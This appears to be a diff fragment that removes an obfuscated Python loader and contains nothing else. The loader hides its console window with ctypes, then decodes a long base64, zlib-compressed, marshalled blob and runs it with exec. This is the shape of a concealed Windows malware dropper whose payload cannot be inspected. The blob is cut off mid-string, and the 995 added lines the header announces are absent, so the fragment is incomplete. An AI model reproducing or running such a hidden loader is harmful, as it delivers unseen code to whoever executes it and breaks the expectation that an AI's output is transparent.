@@ -1,8 +1,995 @@
-import base64,zlib,marshal,os,sys,ctypes,time
-ctypes.windll.kernel32.FreeConsole()
-ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-time.sleep(2)
-try:
-    exec(marshal.loads(zlib.decompress(base64.b64decode("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